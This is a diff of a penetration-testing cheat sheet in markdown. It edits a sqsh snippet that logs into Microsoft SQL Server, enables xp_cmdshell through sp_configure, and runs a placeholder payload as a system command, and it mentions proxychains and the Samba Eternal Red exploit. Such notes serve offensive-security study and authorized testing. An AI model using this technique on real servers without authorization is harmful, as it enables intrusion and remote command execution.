@@ -449,16 +449,13 @@ Some services may have vulnerabilities that allow you to gain shell access.
 ```bash
 # If you are doing it against a host in different subnet, set up the proxy then execute with proxychians
 sqsh -S IP -U DOMAIN_OR_HOST_NAME\\USER -P PASS
-exec sp_configure ‘show advanced options’, 1
-go
-reconfigure
-go
-exec sp_configure ‘xp_cmdshell’, 1
-go
-reconfigure
-go
-xp_cmdshell 'PAYLOAD'
-go
+exec sp_configure ‘show advanced options’, 1;
+reconfigure;
+exec sp_configure ‘xp_cmdshell’, 1;
+reconfigure;
+\go
+xp_cmdshell 'PAYLOAD';
+\go
 ```
 
 #### Samba Eternal Red
